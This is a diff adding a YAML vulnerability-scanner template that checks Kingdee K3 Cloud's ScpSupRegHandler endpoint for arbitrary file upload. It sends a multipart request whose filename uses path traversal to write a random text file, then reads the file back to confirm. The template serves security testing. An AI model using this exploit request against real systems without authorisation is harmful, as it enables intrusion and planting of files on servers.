@@ -1,0 +1,67 @@
+id: kingdee-scpsupreghandler-arbitrary-file-upload
+info:
+  name: Kingdee K3 Cloud ScpSupRegHandler Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload, critical
+  description: |
+    This template checks for an arbitrary file upload vulnerability in the Kingdee K3 Cloud ScpSupRegHandler endpoint.
+http:
+  - name: check-endpoint
+    method: GET
+    path:
+      - "{{BaseURL}}/k3cloud/SRM/ScpSupRegHandler"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"IsSuccess\": true"
+          - "Method\": \"ProcessRequest\""
+  - name: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/k3cloud/SRM/ScpSupRegHandler"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{rand_str}}"
+    body: |
+      ------WebKitFormBoundary{{rand_str}}
+      Content-Disposition: form-data; name="dbId_v"
+
+      .
+      ------WebKitFormBoundary{{rand_str}}
+      Content-Disposition: form-data; name="FID"
+
+      2023
+      ------WebKitFormBoundary{{rand_str}}
+      Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/{{filename}}.txt"
+      Content-Type: text/plain
+
+      {{rand_str}}
+      ------WebKitFormBoundary{{rand_str}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"IsSuccess\": true,"
+          - "附件保存成功！"
+  - name: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/K3Cloud/uploadfiles/{{filename}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{rand_str}}"
+variables:
+  rand_str: "{{rand_base(16)}}"
+  filename: "{{rand_base(4)}}"
